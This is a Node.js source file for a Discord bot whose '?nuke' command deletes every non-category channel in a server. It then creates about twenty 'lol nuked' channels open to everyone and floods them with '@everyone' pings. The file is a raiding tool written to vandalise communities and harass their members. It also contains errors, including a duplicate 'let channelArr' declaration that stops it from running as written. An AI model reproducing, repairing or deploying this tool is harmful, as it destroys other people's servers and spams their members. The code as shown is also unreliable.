const { Client, Intents } = require('discord.js');
const client = new Client({ intents: [Intents.FLAGS.GUILDS, Intents.FLAGS.GUILD_MEMBERS, Intents.FLAGS.GUILD_MESSAGES] });
const prefix = '?';

client.once('ready', () => {
    console.log('uz jedu');
});

client.on('messageCreate', async message =>{
    if(!message.content.startsWith(prefix) || message.author.bot) return;
    const args = message.content.slice(prefix.length).split(" ");
    const command = args.shift().toLowerCase();
    console.log(`${message.author}: ${message.content}`);

    if(command === 'nuke'){
        let channelArr = Array.from(message.guild.channels.cache.values());
        let guild = message.guild;
        console.log(message.channel.guild);
        for(let i = 0; i < channelArr.length; i++){
            console.log(channelArr[i].id, channelArr[i].name, channelArr[i].type);
            if(channelArr[i].type !== 'GUILD_CATEGORY'){
                channelArr[i].delete();
            }
        }
        let spamEveryone = guild.channels.create('lol nuked curaci', 'text');
        for(let i = 0; i < 20; i++){
            let spamChannel = guild.channels.create(`lol nuked [${i}]`,{
                type: 'text',
                permissionOverwrites: [{
                        id: message.guild.roles.everyone,
                        allow: ['VIEW_CHANNEL', 'SEND_MESSAGES', 'READ_MESSAGE_HISTORY'],
                    }
                ],
            })
        }
        let channelArr = Array.from(message.guild.channels.cache.values());
        for(let i = 0; i < 20; i++){
            client.channels.cache.get(channelArr[i].id).send('@everyone');
        }
        
        //client.channels.cache.get(spamChannel).send('<@everyone>');
    }
});

client.login();